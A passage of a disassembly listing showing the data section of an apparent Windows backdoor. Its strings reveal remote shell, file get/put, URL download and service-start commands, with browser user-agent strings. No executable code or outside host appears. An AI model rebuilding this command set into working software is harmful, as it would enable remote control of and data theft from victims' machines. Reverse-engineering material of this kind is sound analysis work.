.data:00404478 db '/p|/s> <pid|ServiceName>',0Dh,0Ah,0
.data:004044B0 ; char SubStr[]
.data:004044B0 SubStr db 'Fetch server error',0
.data:004044C3 align 4
.data:004044C4 ; char aS_1[]
.data:004044C4 aS_1 db '%*[^/]%*[/]%*[^/]%s',0
.data:004044D8 ; char aFilesizeD[]
.data:004044D8 aFilesizeD db 'FileSize:',9,'%d',0
.data:004044E5 align 4
.data:004044E8 ; char aPutf[]
.data:004044E8 aPutf db 'putf',0
.data:004044ED align 10h
.data:004044F0 ; char aSyntaxErrorUsa_3[]
.data:004044F0 aSyntaxErrorUsa_3 db 'Syntax error!',9,'Usage:',9,'getf/p'
.data:004044F0 db 'utf FileName <N>',0Dh,0Ah,0
.data:0040451E align 10h
.data:00404520 ; char aMozilla50[]
.data:00404520 aMozilla50 db 'Mozilla/5.0',0
.data:0040452C ; char aSoLong[]
.data:0040452C aSoLong db 'So long!',0Dh,0Ah,0
.data:00404537 align 4
.data:00404538 ; char aOk_0[]
.data:00404538 aOk_0 db 'OK!',0Dh,0Ah,0
.data:0040453E align 10h
.data:00404540 ; char aExit[]
.data:00404540 aExit db 'exit',0Dh,0Ah,0
.data:00404547 align 4
.data:00404548 ; char aShellStartedWa[]
.data:00404548 aShellStartedWa db 'Shell started,wait to terminate it.'
.data:00404548 db '....',0Dh,0Ah,0
.data:00404572 align 4
.data:00404574 aServiceIsRunni db 0Dh,0Ah
.data:00404574 db 'Service is running already!',0Dh,0Ah
.data:00404574 db 0
.data:00404594 aServiceStarted db 0Dh,0Ah
.data:00404594 db 'Service started!',0Dh,0Ah,0
.data:004045A9 align 4
.data:004045AC ; char aStartserviceFa[]
.data:004045AC aStartserviceFa db 0Dh,0Ah
.data:004045AC db 'StartService failed!',0Dh,0Ah,0
.data:004045C5 align 4
.data:004045C8 ; char aCreateprocessF[]
.data:004045C8 aCreateprocessF db 0Dh,0Ah
.data:004045C8 db 'CreateProcess failed!',0Dh,0Ah,0
.data:004045E2 align 4
.data:004045E4 aProgramStarted db 0Dh,0Ah
.data:004045E4 db 'Program started!',0Dh,0Ah,0
.data:004045F9 align 4
.data:004045FC aSyntaxErrorUsa_1 db 'Syntax error!',9,'Usage:',9,'start '
.data:004045FC db '</p|/s> <filename|ServiceName>',0Dh
.data:004045FC db 0Ah,0
.data:00404638 ; char aSyntaxError[]
.data:00404638 aSyntaxError db 'Syntax error!',0Ah,0
.data:00404647 align 4
.data:00404648 ; char aSyntaxErrorUsa_2[]
.data:00404648 aSyntaxErrorUsa_2 db 0Dh,0Ah
.data:00404648 db 'Syntax error!',9,'Usage:',9,'GetUrl'
.data:00404648 db ' URL FileName',0Dh,0Ah,0
.data:00404675 align 4
.data:00404678 ; char aCreateFailedWi[]
.data:00404678 aCreateFailedWi db 'Create failed with %d!',0Ah,0
.data:00404690 ; char aOk_1[]
.data:00404690 aOk_1 db 'OK!',0Ah,0
.data:00404695 align 4
.data:00404698 ; char aS_0[]
.data:00404698 aS_0 db '"%s"',0
.data:0040469D align 10h
.data:004046A0 ; char aFailedWithD[]
.data:004046A0 aFailedWithD db 'Failed with %d!',0Ah,0
.data:004046B1 align 4
.data:004046B4 dword_4046B4 dd 78h
.data:004046B8 ; char aMozilla40[]
.data:004046B8 aMozilla40 db 'Mozilla/4.0',0
.data:004046C4 ; char asc_4046C4[]
.data:004046C4 asc_4046C4 db '/',0
.data:004046C6 align 4
.data:004046C8 ; char aEaaeUAieeaaoou[]
.data:004046C8 aEaaeUAieeaaoou db '\\',0
.data:004046E1 aUuuuuuuuuuuuuu db 'UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU'
.data:004046E1 db 'UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU'
.data:004046E1 db 'UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU'
.data:004046E1 db 'UUUUUUUUUU',0
.data:00404755 align 10h
.data:00404760 dword_404760 dd 1
.data:00404764 align 8
.data:00404768 ; CHAR szReferrer[8]
.data:00404768 szReferrer db 8 dup(0)
.data:00404770 ; HANDLE hObject
.data:00404770 hObject dd 0
.data:00404774 ; HANDLE dword_404774
.data:00404774 dword_404774 dd 0
.data:00404778 dword_404778 dd 0
.data:0040477C align 10h
.data:00404780 ; char *String2
.data:00404780 String2 dd 0
.data:00404784 ; LPCSTR Str
.data:00404784 Str dd 0
.data:00404788 ; LPCSTR lpServiceName
.data:00404788 lpServiceName dd 0
.data:0040478C ; char *String
.data:0040478C String dd 0
.data:00404790 ; char *Buffer
.data:00404790 Buffer dd 0
.data:00404794 ; char *dword_404794
.data:00404794 dword_404794 dd 0
.data:00404798 align 10h
.data:004047A0 dword_4047A0 dd 0
.data:004047A4 dword_4047A4 dd 0
.data:004047A8 db    0
.data:004047A9 db    0
.data:004047AA db    0
.data:004047AB db    0
.data:004047AC dword_4047AC dd 0
.data:004047B0 dword_4047B0 dd 0
.data:004047B4 dword_4047B4 dd 0
.data:004047B8 dword_4047B8 dd 0
.data:004047BC dword_4047BC dd 0
.data:004047C0 dword_4047C0 dd 0
.data:004047C4 dword_4047C4 dd 0
.data:004047C8 align 1000h
.data:004047C8 _data ends
.data:004047C8
.data:004047C8
.data:004047C8 end start
